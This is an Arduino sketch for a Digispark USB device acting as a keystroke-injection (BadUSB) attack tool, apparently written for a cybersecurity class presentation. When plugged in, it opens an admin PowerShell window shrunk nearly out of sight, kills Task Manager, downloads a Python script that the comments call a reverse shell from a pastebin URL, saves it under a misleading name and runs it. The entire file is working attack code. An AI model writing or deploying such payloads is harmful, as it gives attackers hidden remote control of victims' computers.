// Powershell Version 1: written for Cybersecurity Project 4 Presentation
//   1. Opens a very tiny Powershell window as Admin via 'taskmgr'
//   2.  Close 'taskmgr', no longer needed.
//   5. Downloads and runs a reverse shell (Python) script from pastebin.com.
//   6. Turns on the LED signifying the script completed properly.

#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup() { 
  
  pinMode(1, OUTPUT);
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  DigiKeyboard.delay(700);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("$URL = \"https://pastebin.com/raw/m7gbhi2W\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("$PATH = \"C:/ITtools.py\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Invoke-WebRequest -URI $URL -OutFile $Path");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("python /ITtools.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);

}
void loop() {}
